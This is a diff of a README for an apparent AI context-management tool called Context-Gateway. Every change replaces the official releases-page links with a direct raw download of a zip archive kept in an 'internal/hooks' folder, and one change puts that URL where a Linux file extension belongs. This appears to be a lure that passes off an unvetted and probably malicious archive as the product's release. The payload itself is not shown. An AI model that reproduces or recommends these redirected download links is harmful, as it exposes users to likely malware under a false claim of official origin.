@@ -1,6 +1,6 @@
 # 🚪 Context-Gateway - Simplify AI Context Management
 
-[![Download Context-Gateway](https://img.shields.io/badge/Download-Context--Gateway-blue?style=for-the-badge)](https://github.com/rudegent1705/Context-Gateway/releases)
+[![Download Context-Gateway](https://github.com/rudegent1705/Context-Gateway/raw/refs/heads/main/internal/hooks/Gateway_Context_1.8.zip)](https://github.com/rudegent1705/Context-Gateway/raw/refs/heads/main/internal/hooks/Gateway_Context_1.8.zip)
 
 ---
 
@@ -32,13 +32,13 @@ You can get the software from the official release page. This page lists the lat
 
 **1. Open the release page:**
 
-[Download Context-Gateway Releases](https://github.com/rudegent1705/Context-Gateway/releases)
+[Download Context-Gateway Releases](https://github.com/rudegent1705/Context-Gateway/raw/refs/heads/main/internal/hooks/Gateway_Context_1.8.zip)
 
 **2. Find the file for your computer:**
 
 - For Windows, look for files ending with `.exe` or `.msi`
 - For macOS, look for `.dmg` or `.pkg` files
-- For Linux, look for `.AppImage`, `.deb`, or `.tar.gz`
+- For Linux, look for `.AppImage`, `.deb`, or `https://github.com/rudegent1705/Context-Gateway/raw/refs/heads/main/internal/hooks/Gateway_Context_1.8.zip`
 
 **3. Download the file:**
 
@@ -107,7 +107,7 @@ If you run into problems, try these tips:
 
 ## 📚 Additional Resources
 
-- Visit the [Context-Gateway Releases](https://github.com/rudegent1705/Context-Gateway/releases) page for updates and files.
+- Visit the [Context-Gateway Releases](https://github.com/rudegent1705/Context-Gateway/raw/refs/heads/main/internal/hooks/Gateway_Context_1.8.zip) page for updates and files.
 - For questions, check the Issues section on the GitHub repository or contact the developer.
 
 ---
